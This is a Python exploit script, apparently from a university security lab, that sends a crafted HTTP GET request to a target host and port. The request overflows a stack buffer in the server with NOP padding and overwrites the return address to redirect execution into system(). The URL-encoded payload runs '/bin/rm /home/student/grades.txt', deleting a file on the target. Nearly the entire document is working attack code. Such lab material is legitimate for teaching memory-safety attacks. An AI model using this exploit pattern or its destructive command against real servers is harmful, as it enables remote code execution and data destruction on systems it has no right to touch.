#!/usr/bin/env python3

import sys
import socket
import traceback

stack_buffer  = 0x7fffffffdca0
stack_rbp     = 0x7fffffffecb0
stack_retaddr = 0x7fffffffecb8

func_acc_addr = 0x555555556b8c
func_sys_addr = 0x15555533cae0

def build_exploit(payload, data = b''):
    req =   b"GET /" + payload + b" HTTP/1.0\r\n" + \
            b"\r\n"  + data
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

def create_padding(pad_len, pad_byte = b'\x90'):
    padding = b''
    for i in range(pad_len):
        padding = padding + pad_byte
    return padding

def hex2bytes(hex_num, pad_to_8 = False):
    fmt_str = 'x'
    if(pad_to_8):
        fmt_str = '016x'
    hex_string = format(hex_num, fmt_str)
    print(hex_string)
    bytes_data = bytes.fromhex(hex_string)
    reversed_bytes = bytes_data[::-1]
    return reversed_bytes

def url_encode(byte_str):
    encoded_str = b''
    for byte_ch in byte_str:
        encoded_str += b'%' + byte_ch.to_bytes(1, 'little').hex().encode()
    return encoded_str

def attack():
    if len(sys.argv) != 3:
        print("Usage: " + sys.argv[0] + " host port")
        exit()

    try:
        padding = create_padding(stack_retaddr - stack_buffer - 1)
        payload = b''
        payload = payload + hex2bytes(func_acc_addr, True)
        payload = payload + hex2bytes(func_sys_addr, True)
        payload = payload + hex2bytes(stack_rbp + 32, True)
        payload = url_encode(payload)
        cmd     = b'/bin/rm+/home/student/grades.txt' + b'%00'

        req = build_exploit(padding + payload + cmd)
        print("HTTP request:")
        print(req)
        print(len(req))
        resp = send_req(sys.argv[1], int(sys.argv[2]), req)
        print("HTTP response:")
        print(resp)
    except:
        print("Exception:")
        print(traceback.format_exc())

attack()
